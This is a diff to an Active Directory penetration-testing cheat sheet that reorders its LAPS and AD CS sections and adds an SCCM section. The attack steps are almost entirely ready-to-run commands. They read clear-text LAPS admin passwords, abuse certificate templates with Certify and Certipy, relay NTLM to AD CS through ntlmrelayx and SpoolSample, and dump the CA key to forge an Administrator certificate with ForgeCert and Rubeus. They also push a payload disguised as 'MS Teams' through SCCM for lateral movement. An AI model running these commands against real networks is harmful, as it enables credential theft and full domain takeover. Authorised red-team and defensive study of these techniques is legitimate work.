@@ -40,13 +40,16 @@
     * [Webclient Attack](#Webclient-Attack)
     * [Computer object takeover](#Computer-object-Takeover) 
     * [Change-Lockscreen](#Change-Lockscreen)
-* [Relaying attacks](#Relaying-attacks)
+* [Local Administrator Password Solution(LAPS)](#LAPS)
 * [MS Exchange](#MS-Exchange) 
   * [Attacking externally](#Attacking-externally)
   * [Attacking from the inside](#Attacking-from-the-inside)
   * [MS Exchange escalating privileges](#MS-Exchange-escalating-privileges)
   * [NTLM Relay MS Exchange abuse](#NTLM-Relay-MS-Exchange-abuse)
-* [Local Administrator Password Solution(LAPS)](#LAPS)
+* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
+  * [Misconfigured Certificate Templates](#Misconfigured-Certificate-Templates)
+  * [Relaying to ADCS HTTP Endpoints](#Relaying-to-ADCS-HTTP-Endpoints)
+  * [Forged Certificates](#Forged-Certificates)
 * [SQL Server](#SQL-Server)
   * [Locating and accessing SQL Servers](#Locating-and-accessing-SQL-Servers)
   * [Initial foothold](#Initial-foothold)
@@ -60,10 +63,7 @@
   * [Data exfiltration](#Data-exfiltration)
   * [SQL Queries](#SQL-Queries)
 * [WSUS](#Attacking-WSUS)
-* [Active Directory Certificate Services](#Active-Directory-Certificate-Services)
-  * [Misconfigured Certificate Templates](#Misconfigured-Certificate-Templates)
-  * [Relaying to ADCS HTTP Endpoints](#Relaying-to-ADCS-HTTP-Endpoints)
-  * [Forged Certificates](#Forged-Certificates)
+* [SCCM](#SCCM)
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [Kerberoast](#Kerberoast)
   * [MS Exchange](#MS-Exchange)
@@ -1244,10 +1244,88 @@ export KRB5CCNAME=administrator.ccache
 Psexec.py -k -no-pass <TARGET FQDN>
 ```
 
-## Relaying attacks
-- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
+## LAPS
+- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
+- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
 
-[Relaying section](relaying.md)
+#### Check if LAPS is installed on local computer
+```
+Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
+```
+
+### Check existence of LAPS in the domain
+#### Check for existence of the ms-mcs-admpwd attribute
+```
+Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+```
+
+#### Check for computers with LAPS installed
+```
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
+```
+
+#### Check for GPO's with LAPS in its name
+```
+Get-DomainGPO -Identity *LAPS*
+```
+
+#### Check for OU's with LAPS
+```
+Get-DomainOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }
+```
+
+#### Check which computers is part of the OU
+```
+Get-DomainOU -OUName <NAME> | %{Get-DomainComputer -ADSpath $_}
+```
+
+#### Check to which computers the LAPS GPO is applied to
+```
+Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
+Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
+```
+
+#### Check all computers without LAPS
+```
+Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
+```
+
+#### Check the LAPS configuration
+- https://github.com/PowerShell/GPRegistryPolicy
+- Password complexity, password length, password expiration, Acccount managing LAPS
+- AdmPwdEnabled 1 = local administrator password is managed
+- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
+```
+Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
+```
+
+#### Find all users who can read passwords in clear text machines in OU's
+```
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
+```
+
+```
+Import-Module AdmPwd.PS.psd1
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+```
+
+#### If retured groups, get the users:
+```
+$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
+$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
+```
+
+#### Read clear-text passwords:
+```
+Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
+Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+
+#LAPS Powershell cmdlet
+Get-AdmPwdPassword -ComputerName <MACHINE NAME>
+```
 
 ## MS Exchange
 - Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
@@ -1437,88 +1515,127 @@ sudo python3 ntlmrelayx.py -t https://<EXCH HOST>/EWS/Exchange.asmx
 python3 aclpwn.py --restore aclpwn.restore
 ```
 
-## LAPS
-- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.
-- Another great tool to use: https://github.com/leoloobeek/LAPSToolkit
+## Active Directory Certificate Services
+- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
+- https://www.thehacker.recipes/ad/movement/ad-cs
+- https://github.com/GhostPack/Certify
+- https://github.com/ly4k/Certipy
 
-#### Check if LAPS is installed on local computer
+#### Find AD CS Certificate authorities (CA's)
 ```
-Get-Childitem 'C:\Program Files\LAPS\CSE\AdmPwd.dll'
-```
+.\Certify.exe cas
 
-### Check existence of LAPS in the domain
-#### Check for existence of the ms-mcs-admpwd attribute
-```
-Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=<DOMAIN>'
+Get-DomainGroupMember "Cert Publishers"
 ```
 
-#### Check for computers with LAPS installed
+#### Get enabled templates
 ```
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime | select-object samaccountname
-```
-
-#### Check for GPO's with LAPS in its name
-```
-Get-DomainGPO -Identity *LAPS*
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
 ```
 
-#### Check for OU's with LAPS
+#### Enumerate vulnerabilities
 ```
-Get-DomainOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -old-bloodhound
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
+
+.\Certify.exe find /vulnerable
 ```
 
-#### Check which computers is part of the OU
+### Misconfigured Certificate Templates
+- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
+
+#### Find misconfigured certificate templates
+- Prerequisite: ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is disabled.
+- If a object owned has `WriteOwner`, `WriteDacl` or `WriteProperty`, then this could also be abused.
+- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
 ```
-Get-DomainOU -OUName <NAME> | %{Get-DomainComputer -ADSpath $_}
+.\Certify.exe find /vulnerable
 ```
 
-#### Check to which computers the LAPS GPO is applied to
+#### Request certificate for a user
+- For example domain admin
 ```
-Get-DomainOU -GPLink "<Distinguishedname from GET-DOMAINGPO>" | select name, distinguishedname
-Get-DomainComputer -Searchbase "LDAP://<distinguishedname>" -Properties Distinguishedname
+.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
+```
+- Save cert + key in a cert.pem file
+
+#### Transform cert to pfx
+- Set a password, `password`
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-#### Check all computers without LAPS
+#### Rubeus ask TGT using the certificate
 ```
-Get-DomainComputer | Where-object -property ms-Mcs-AdmPwdExpirationTime -like $null | select-object samaccountname
-```
-
-#### Check the LAPS configuration
-- https://github.com/PowerShell/GPRegistryPolicy
-- Password complexity, password length, password expiration, Acccount managing LAPS
-- AdmPwdEnabled 1 = local administrator password is managed
-- Passwordcomplexity 1 = large letters, 2 = large + small letters, 3 = Large + small + numbers, 4 = large + small + numbers + specials
-```
-Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
 ```
 
-#### Find all users who can read passwords in clear text machines in OU's
+#### Write TGT kirbi
 ```
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+ 
+#### Then load TGT and request TGS or access systems as this user.
 
-Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | Select-Object ObjectDN, IdentityName
+### Relaying to ADCS HTTP Endpoints
+- ADCS services supports HTTP enrolment and has a GUI. Endpoint: `http[s]://<hostname>/certsrv` and by default supports NTLM and Negotiate authentication methods.
+- If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks. A abuse method is to relay authentication of a machine to the CA to obtain a certificate and request a TGT.
+- The certificate template used needs to be configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.
+- The default User and Machine/Computer templates match those criteria and are very often enabled.
+
+#### Find Vulnerable ESC8 CA's
+```
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -B20 ESC8
+
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
 ```
 
+#### Start ntlmrelayx.py
 ```
-Import-Module AdmPwd.PS.psd1
-Find-AdmPwdExtendedRights -Identity OUDistinguishedName
+ntlmrelayx.py -t http://<IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+```
+ 
+#### Force authentication
+```
+.\SpoolSample.exe <IP> <IP>
+```
+ 
+#### Ouput should give a TGT which can be used with S4U2self
+- LINK TO S4U2self
+ 
+### Forged Certificates
+#### Dump the private keys
+- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
+- https://github.com/GhostPack/SharpDPAPI
+```
+.\SharpDPAPI.exe certificates /machine
+```
+- Save cert + key in a cert.pem file
+
+#### Transform cert to pfx
+- Set a password, password
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
-#### If retured groups, get the users:
+#### Create a forged certificate
 ```
-$LAPSAdmins = Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins += Get-DomainGroup <GROUP> | Get-DomainGroupMember -Recursive
-$LAPSAdmins | select Name, distinguishedName | sort name -Unique | fortmat-table -auto
+.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
 ```
 
-#### Read clear-text passwords:
+#### Create a TGT
 ```
-Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
-Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
+```
 
-#LAPS Powershell cmdlet
-Get-AdmPwdPassword -ComputerName <MACHINE NAME>
+#### Write TGT kirbi
 ```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+ 
+#### Then load TGT and request TGS or access systems as this user.
 
 ## SQL Server
 - Could be possible cross domain or cross forest!
@@ -2057,128 +2174,108 @@ req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Conn
 Get-WsusUpdate -Approval Unapproved
 Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
 ```
- 
-## Active Directory Certificate Services
-- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
-- https://www.thehacker.recipes/ad/movement/ad-cs
-- https://github.com/GhostPack/Certify
-- https://github.com/ly4k/Certipy
 
-#### Find AD CS Certificate authorities (CA's)
+## SCCM
+### PowerSCCM
+- https://github.com/PowerShellMafia/PowerSCCM
+
+#### Get site code
 ```
-.\Certify.exe cas
-
-Get-DomainGroupMember "Cert Publishers"
+Find-SccmSiteCode -Computername <FQDN>
 ```
 
-#### Get enabled templates
+#### Get Site code locally
 ```
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
-```
-
-#### Enumerate vulnerabilities
-```
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -old-bloodhound
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
-
-.\Certify.exe find /vulnerable
+Find-LocalSccmInfo
 ```
 
-### Misconfigured Certificate Templates
-- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
-
-#### Find misconfigured certificate templates
-- Prerequisite: ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is disabled.
-- If a object owned has `WriteOwner`, `WriteDacl` or `WriteProperty`, then this could also be abused.
-- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
+#### Open a session
+- If error `Error connecting to sccm.GiganticHosting.local\ via WMI ` try `-ConnectionType DB `
+- Some commands require WMI, with enough permissions to WMI you can access (other user, or system on SSCM server for example)
 ```
-.\Certify.exe find /vulnerable
+$sess = New-SccmSession -ComputerName <FQDN> -SiteCode <SITECODE> -ConnectionType WMI
+$sess = New-SccmSession -ComputerName <FQDN> -SiteCode <SITECODE> -ConnectionType DB
 ```
 
-#### Request certificate for a user
-- For example domain admin
+#### List sessions
 ```
-.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
-```
-- Save cert + key in a cert.pem file
-
-#### Transform cert to pfx
-- Set a password, `password`
-```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Get-SccmSession
 ```
 
-#### Rubeus ask TGT using the certificate
+#### Close sessions
 ```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
-```
-
-#### Write TGT kirbi
-```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
-```
- 
-#### Then load TGT and request TGS or access systems as this user.
-
-### Relaying to ADCS HTTP Endpoints
-- ADCS services supports HTTP enrolment and has a GUI. Endpoint: `http[s]://<hostname>/certsrv` and by default supports NTLM and Negotiate authentication methods.
-- If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks. A abuse method is to relay authentication of a machine to the CA to obtain a certificate and request a TGT.
-- The certificate template used needs to be configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.
-- The default User and Machine/Computer templates match those criteria and are very often enabled.
-
-#### Find Vulnerable ESC8 CA's
-```
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -B20 ESC8
-
-certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
+Remove-SccmSession -Session <ID>
 ```
 
-#### Start ntlmrelayx.py
+#### Get user deployed applications
 ```
-ntlmrelayx.py -t http://<IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
-```
- 
-#### Force authentication
-```
-.\SpoolSample.exe <IP> <IP>
-```
- 
-#### Ouput should give a TGT which can be used with S4U2self
-- LINK TO S4U2self
- 
-### Forged Certificates
-#### Dump the private keys
-- Execute on the CA server. You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.
-- https://github.com/GhostPack/SharpDPAPI
-```
-.\SharpDPAPI.exe certificates /machine
-```
-- Save cert + key in a cert.pem file
-
-#### Transform cert to pfx
-- Set a password, password
-```
-openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Get-SccmApplication -Session $sess
 ```
 
-#### Create a forged certificate
+### Push application
+#### Get computers to move laterally to
 ```
-.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@<DOMAIN>" --NewCertPath fake.pfx --NewCertPassword "password"
-```
-
-#### Create a TGT
-```
-cat cert.pfx | base64 -w 0
-.\Rubeus.exe asktgt /user:Administrator /domain:<DOMAIN> /certificate:<BASE64 CERT> /password:password /nowrap
+Get-SccmComputer -Session $sess
 ```
 
-#### Write TGT kirbi
+#### Create a computer collection
 ```
-[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+New-SccmCollection -Session $sess -CollectionName "MS Teams" -CollectionType "Device"
 ```
- 
-#### Then load TGT and request TGS or access systems as this user.
+
+#### Add computers to the collection
+```
+Add-SccmDeviceToCollection -Session $sess -ComputerNameToAdd "<TARGET NAME>" -CollectionName "MS Teams"
+```
+
+#### Create an application to deploy
+```
+New-SccmApplication -Session $sess -ApplicationName "Teams" -PowerShellB64 "<powershell_script_in_Base64>"
+```
+
+#### Create an application deployment with the application and the collection previously created
+```
+New-SccmApplicationDeployment -Session $sess -ApplicationName "Teams" -AssignmentName "Push Teams" -CollectionName "MS Teams"
+```
+
+#### Force the machine in the collection to check the application update (and force the install)
+```
+Invoke-SCCMDeviceCheckin -Session $sess -CollectionName "MS Teams"
+```
+
+### Push script
+- https://github.com/PowerShellMafia/PowerSCCM/pull/6
+#### Get computers to move laterally to
+```
+Get-SccmComputer -Session $sess
+```
+
+#### Push script
+```
+New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '<SCCM FQDN>' -TargetDevice '<TARGET NAME>' -Path '<SCRIPT>' -ScriptName 'Push MS Teams'
+```
+
+### MalSCCM
+- https://github.com/nettitude/MalSCCM
+- Not final, didn't work inside the lab when I tried.
+
+#### Locate SCCM Primary/Management Servers
+```
+./MalSCCM.exe locate
+```
+
+#### Compromise management server, use locate to find primary server
+```
+./MalSCCM.exe locate
+```
+
+#### Get information
+```
+MalSCCM.exe inspect /all
+MalSCCM.exe inspect /computers
+MalSCCM.exe inspect /primaryusers
+MalSCCM.exe inspect /groups
+```
  
 ## Cross Domain attacks
 ## Azure AD
